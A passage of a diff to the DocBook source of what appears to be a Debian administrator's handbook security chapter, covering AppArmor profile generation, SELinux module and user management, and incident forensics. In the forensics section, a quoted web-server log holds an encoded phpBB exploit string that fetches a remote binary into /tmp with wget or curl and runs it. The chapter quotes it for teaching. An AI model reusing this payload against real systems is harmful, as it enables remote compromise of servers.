+            file. If we allow the creation of this specific file only, the program
+            will not work when the user will use it on another network interface.
+            Thus we select “New” to replace the filename with the more generic
+            “/run/dhclient*.pid” before recording the rule with “Allow”.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-other-profile">
+          <para>
+            Notice that this access request is not part of the dhclient
+            profile but of the new profile that we created when we allowed
+            <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to
+            run with its own profile.
+          </para>
+          <para>
+            After having gone through all the logged events, the program
+            offers to save all the profiles that were created during the
+            run. In this case, we have two profiles that we save at once
+            with “Save” (but you can save them individually too) before
+            leaving the program with “Finish”.
+          </para>
+        </callout>
+      </calloutlist>
+      <para>
+        <command>aa-genprof</command> is in fact only a smart wrapper
+        around <command>aa-logprof</command>: it creates an empty profile,
+        loads it in complain mode and then run
+        <command>aa-logprof</command> which is a tool to update a profile
+        based on the profile violations that have been logged. So you can
+        re-run that tool later to improve the profile that you just
+        created.
+      </para>
+      <para>
+        If you want the generated profile to be complete, you should use the
+        program in all the ways that it is legitimately used. In the case
+        of dhclient, it means running it via Network Manager, running it via
+        ifupdwon, running it manually, etc. In the end, you might get
+      </para>
+    </section>
+
+
+  </section>
+
   <section id="sect.selinux">
     <title>Introduction to SELinux</title>
     <indexterm><primary>SELinux</primary></indexterm>
@@ -1258,9 +1650,32 @@ iface eth0 inet static
       Debian. The core Unix tools support SELinux without any
       modifications. It is thus relatively easy to enable SELinux.</para>
 
-      <para>The <command>aptitude install selinux-basics
+      <para>The <command>apt install selinux-basics
       selinux-policy-default</command> command will automatically install
       the packages required to configure an SELinux system.</para>
+
+      <sidebar>
+        <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
+        <para>
+          Unfortunately the maintainers of the <emphasis
+            role="pkg">refpolicy</emphasis> source package did not handle
+          release critical bugs on their package and the package got
+          removed from jessie. This means that the <emphasis
+            role="pkg">selinux-policy-*</emphasis> packages are currently not
+          installable in jessie and needs to be fetched from another
+          place. Hopefully they will come back in one of the point releases
+          or in jessie-backports. In the mean time, you can grab them
+          from unstable.
+        </para>
+        <para>
+          This sad situation at least proves that SELinux is not very popular
+          in the set of users/developers who are running the development
+          versions of Debian. Thus, if you opt to use SELinux, you
+          should expect the default policy to not work perfectly and
+          you will have to invest quite some time to make it suitable
+          to your specific needs.
+        </para>
+      </sidebar>
 
       <para>The <emphasis role="pkg">selinux-policy-default</emphasis>
       package contains a set of standard rules. By default, this policy
@@ -1278,7 +1693,7 @@ iface eth0 inet static
       relabel</command>.</para>
 
       <para>The SELinux system is now ready. To enable it, you should add
-      the <literal>selinux=1</literal> parameter to the Linux kernel. The
+      the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The
       <literal>audit=1</literal> parameter enables SELinux logging which
       records all the denied operations. Finally, the
       <literal>enforcing=1</literal> parameter brings the rules into
@@ -1342,26 +1757,34 @@ iface eth0 inet static
 	<filename>/usr/share/selinux/default/</filename> directory. To
 	enable one of these modules in the current configuration, you
 	should use <command>semodule -i
-	<replaceable>module.pp</replaceable></command>. The
-	<emphasis>pp</emphasis> extension stands for <emphasis>policy
-	package</emphasis>.</para>
+	<replaceable>module.pp.bz2</replaceable></command>. The
+	<emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy
+	package</emphasis> (compressed with bzip2).</para>
 
 	<para>Removing a module from the current configuration is done with
 	<command>semodule -r <replaceable>module</replaceable></command>.
 	Finally, the <command>semodule -l</command> command lists the
-	modules which are currently enabled. It also outputs their version
-	numbers.</para>
+	modules which are currently installed. It also outputs their version
+        numbers. Modules can be selectively enabled with <command>semodule -e</command>
+        and disabled with <command>semodule -d</command>.</para>
 
-        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>
+        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
 <computeroutput># </computeroutput><userinput>semodule -l</userinput>
-<computeroutput>aide    1.4.0
-apache  1.10.0
-apm     1.7.0
+<computeroutput>abrt    1.5.0   Disabled
+accountsd       1.1.0   
+acct    1.6.0   
 [...]</computeroutput>
-<computeroutput># </computeroutput><userinput>semodule -r aide</userinput>
+<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
 <computeroutput># </computeroutput><userinput>semodule -l</userinput>
-<computeroutput>apache  1.10.0
-apm     1.7.0
+<computeroutput>abrt    1.5.0
+accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>accountsd       1.1.0   Disabled
+acct    1.6.0   
 [...]</computeroutput>
 </screen>
 
@@ -1405,12 +1828,12 @@ apm     1.7.0
         <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
 <computeroutput># </computeroutput><userinput>semanage login -l</userinput>
 <computeroutput>
-Login Name                SELinux User              MLS/MCS Range
+Login Name           SELinux User         MLS/MCS Range        Service
 
-__default__               unconfined_u              s0-s0:c0.c1023
-rhertzog                  user_u                    None
-root                      unconfined_u              s0-s0:c0.c1023
-system_u                  system_u                  s0-s0:c0.c1023
+__default__          unconfined_u         SystemLow-SystemHigh *
+rhertzog             user_u               SystemLow            *
+root                 unconfined_u         SystemLow-SystemHigh *
+system_u             system_u             SystemLow-SystemHigh *
 # </computeroutput><userinput>semanage login -d rhertzog</userinput> 
 </screen>
 
@@ -1433,16 +1856,16 @@ system_u                  system_u                  s0-s0:c0.c1023
         <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
 <computeroutput># </computeroutput><userinput>semanage user -l</userinput>
 <computeroutput>
-                Labeling   MLS/       MLS/
-SELinux User    Prefix     MCS Level  MCS Range        SELinux Roles
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles
 
-root            sysadm     s0         s0-s0:c0.c1023   staff_r sysadm_r system_r
-staff_u         staff      s0         s0-s0:c0.c1023   staff_r sysadm_r
-sysadm_u        sysadm     s0         s0-s0:c0.c1023   sysadm_r
-system_u        user       s0         s0-s0:c0.c1023   system_r
-test_u          staff      s0         s0               staff_r user_r
-unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r
-user_u          user       s0         s0               user_r
+root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
+staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
+sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
+system_u        user       SystemLow  SystemLow-SystemHigh  system_r
+test_u          staff      SystemLow  SystemLow             staff_r user_r
+unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
+user_u          user       SystemLow  SystemLow             user_r
 # </computeroutput><userinput>semanage user -d test_u</userinput>
 </screen>
       </section>
@@ -1504,9 +1927,9 @@ user_u          user       s0         s0               user_r
       sample files that can be used as templates to create new modules.
       Install those files and study them more closely:</para>
 
-      <screen><computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>
-<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>
-<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>
+      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
 <computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>
 </screen>
 
@@ -1516,7 +1939,7 @@ user_u          user       s0         s0               user_r
       this module. The data within the <filename>.fc</filename> file are
       used during the file labeling step. Finally, the
       <filename>.if</filename> file defines the interface of the module:
-      it's a set of “public functions” that other modules can use to
+      it is a set of “public functions” that other modules can use to
       properly interact with the module that you're creating.</para>
       <section>
         <title>Writing a <filename>.fc</filename> file</title>
@@ -1620,7 +2043,7 @@ interface(`myapp_read_log',`
 	  the SELinux field. Their wiki contains explanations on how the
 	  rules are structured and how you can create new ones. <ulink
 	  type="block"
-	  url="http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted"/></para>
+	  url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted"/></para>
         </sidebar>
       </section>
       <section>
@@ -1730,7 +2153,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 	    <replaceable>operation2</replaceable> }</literal>. However, you
 	    can also use macros representing the most useful permissions.
 	    The
-	    <filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename>
+	    <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename>
 	    lists them.</para>
 
 	    <para>The following web page provides a relatively exhaustive
@@ -1753,7 +2176,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 	can now identify the operations to allow. Here is an example of
 	such a log entry:</para>
 
-        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file
+        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
 </programlisting>
 
 	<para>To better understand this message, let us study it piece by
@@ -1797,13 +2220,13 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
                 <entry>
                   <computeroutput>name="xconsole"</computeroutput>
                 </entry>
-                <entry>The target object was named <literal>xconsole</literal>.</entry>
+                <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>
               </row>
               <row>
                 <entry>
                   <computeroutput>dev=tmpfs</computeroutput>
                 </entry>
-                <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “hda3”).</entry>
+                <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”).</entry>
               </row>
               <row>
                 <entry>
@@ -1852,6 +2275,8 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 
         <sidebar>
           <title><emphasis>COMPLEMENTS</emphasis> No roles in policy rules</title>
+          <indexterm><primary>Type Enforcement</primary></indexterm>
+          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>
 
 	  <para>It might seem weird that roles do not appear at all when
 	  creating new rules. SELinux uses only the domains to find out
@@ -1859,10 +2284,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 	  by allowing the user to switch to another domain. SELinux is
 	  based on a theory known as <emphasis>Type Enforcement</emphasis>
 	  and the type is the only element that matters when granting
-	  rights. <indexterm><primary>Type
-	  Enforcement</primary></indexterm>
-	  <indexterm><primary>Enforcement, Type
-	  Enforcement</primary></indexterm></para>
+	  rights.</para>
         </sidebar>
       </section>
       <section>
@@ -1871,7 +2293,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 	<para>Once the 3 files (<filename>example.if</filename>,
 	<filename>example.fc</filename>, and
 	<filename>example.te</filename>) match your expectations for the
-	new rules, just run <command>make</command> to generate a module in
+	new rules, just run <command>make NAME=devel</command> to generate a module in
 	the <filename>example.pp</filename> file (you can immediately load
 	it with <command>semodule -i example.pp</command>). If several
 	modules are defined, <command>make</command> will create all the
@@ -1883,7 +2305,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
     <title>Other Security-Related Considerations</title>
 
     <para>Security is not just a technical problem; more than anything,
-    it's about good practices and understanding the risks. This section
+    it is about good practices and understanding the risks. This section
     reviews some of the more common risks, as well as a few best practices
     which should, depending on the case, increase security or lessen the
     impact of a successful attack.</para>
@@ -1944,9 +2366,11 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 	but it can pay off when the web application to be deployed has a
 	dubious track record where security is concerned.</para>
 
-	<para><emphasis>mod-security</emphasis> (in the <emphasis
-	role="pkg">libapache-mod-security</emphasis> package) is the main
-	such module.</para>
+	<para><emphasis>mod-security2</emphasis> (in the <emphasis
+	role="pkg">libapache2-mod-security2</emphasis> package) is the main
+        such module. It even comes with many ready-to-use rules of its own
+        (in the <emphasis role="pkg">modsecurity-crs</emphasis> package)
+        that you can easily enable.</para>
         <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
         <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
       </sidebar>
@@ -1970,7 +2394,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
       that will download some malware into <filename>/tmp/</filename>, then
       executing it. The malware is often downloaded from a foreign website
       that was previously compromised, in order to cover tracks and make it
-      harder to follow the scent to the actual origin of the attack.</para>
+      harder to find out the actual origin of the attack.</para>
 
       <para>At this point, the attacker has enough freedom of movement that
       they often install an IRC <emphasis>bot</emphasis> (a robot that
@@ -2069,7 +2493,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
       services and many tools. In many cases, these services and tools are
       not required for the actual purposes for which the administrator set
       up the machine. As a general guideline in security matters, unneeded
-      software is best uninstalled. Indeed, there's no point in securing an
+      software is best uninstalled. Indeed, there is no point in securing an
       FTP server, if a vulnerability in a different, unused service can be
       used to get administrator privileges on the whole machine.</para>
 
@@ -2086,8 +2510,8 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
       other services hosted on the same computer. This risk can be
       mitigated by isolating the services. This can be attained either with
       virtualization (each service being hosted in a dedicated virtual
-      machine), or with SELinux (each service daemon having an adequately
-      designed set of permissions).</para>
+      machine or container), or with AppArmor/SELinux (each service daemon
+      having an adequately designed set of permissions).</para>
     </section>
     <section>
       <title>Users Are Players</title>
@@ -2304,12 +2728,11 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
     <section>
       <title>Re-installing</title>
       <indexterm><primary>backdoor</primary></indexterm>
-      <indexterm><primary>backdoor</primary></indexterm>
 
       <para>The server should not be brought back on line without a
       complete reinstallation. If the compromise was severe (if
       administrative privileges were obtained), there is almost no other
-      way to be sure that we're rid of everything the attacker may have
+      way to be sure that we get rid of everything the attacker may have
       left behind (particularly <emphasis>backdoors</emphasis>). Of course,
       all the latest security updates must also be applied so as to plug
       the vulnerability used by the attacker. Ideally, analyzing the attack
@@ -2361,23 +2784,16 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
         </listitem>
       </itemizedlist>
 
-      <para>Some of these operations can be made easier with specialized
-      software. In particular, <emphasis>The Coroner Toolkit</emphasis> (in
-      the <emphasis role="pkg">tct</emphasis> package) is a collection of
-      such tools. It includes several tools; amongst these,
-      <command>grave-robber</command> can collect data from a running
-      compromised system, <command>lazarus</command> extracts often
-      interesting data from non-allocated regions on disks, and
-      <command>pcat</command> can copy the memory used by a process; other
-      data extraction tools are also included. <indexterm><primary>The
-      Coroner Toolkit</primary></indexterm></para>
-
-      <para>The <emphasis role="pkg">sleuthkit</emphasis> package provides
-      a few other tools to analyze a filesystem. Their use is made easier
-      by the <emphasis>Autopsy Forensic Browser</emphasis> graphical
-      interface (in the <emphasis role="pkg">autopsy</emphasis> package).
-      <indexterm><primary>Autopsy Forensic
-      Browser</primary></indexterm></para>
+      <para>
+        Some of these operations can be made easier with specialized
+        software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
+        package provides many tools to analyze a filesystem. Their use is
+        made easier by the <emphasis>Autopsy Forensic Browser</emphasis>
+        graphical interface (in the <emphasis
+          role="pkg">autopsy</emphasis> package).
+      </para>
+      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
+      <indexterm><primary>The Sleuth Kit</primary></indexterm>
     </section>
     <section>
       <title>Reconstituting the Attack Scenario</title>
@@ -2395,10 +2811,12 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
       </programlisting>
 
-      <para>This example matches exploitation of an old security
-      vulnerability in phpBB. <ulink type="block"
-      url="http://secunia.com/advisories/13239/"/> <ulink type="block"
-      url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636"/></para>
+      <para>
+        This example matches exploitation of an old security
+        vulnerability in phpBB.
+        <ulink type="block" url="http://secunia.com/advisories/13239/"/>
+        <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636"/>
+      </para>
 
       <para>Decoding this long URL leads to understanding that the attacker
       managed to run some PHP code, namely: <command>system("cd /tmp; wget
